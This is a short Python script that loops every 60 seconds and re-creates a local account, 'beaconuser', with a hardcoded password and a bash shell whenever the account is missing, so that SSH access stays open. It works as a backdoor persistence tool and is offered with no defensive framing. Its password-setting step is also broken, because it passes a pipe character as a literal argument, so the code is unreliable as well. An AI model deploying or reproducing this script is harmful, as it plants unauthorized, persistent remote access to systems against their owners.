import os
import pwd
import subprocess
import time

# Configuration
USERNAME = 'beaconuser'  # Replace with your desired username
PASSWORD = 'StrongPassword123!'  # Replace with your desired password
INTERVAL = 60  # Check interval in seconds

def user_exists(username):
    try:
        pwd.getpwnam(username)
        return True
    except KeyError:
        return False

def create_user(username, password):
    try:
        # Create the user with the specified password
        subprocess.run(['sudo', 'useradd', '-m', '-s', '/bin/bash', username], check=True)
        subprocess.run(['echo', f'{username}:{password}', '|', 'sudo', 'chpasswd'], check=True)
        print(f"User {username} created successfully with password authentication.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to create user {username}: {e}")

def ensure_ssh_access():
    if not user_exists(USERNAME):
        create_user(USERNAME, PASSWORD)
    else:
        print(f"User {USERNAME} already exists. SSH access is ensured.")

if __name__ == "__main__":
    while True:
        ensure_ssh_access()
        time.sleep(INTERVAL)
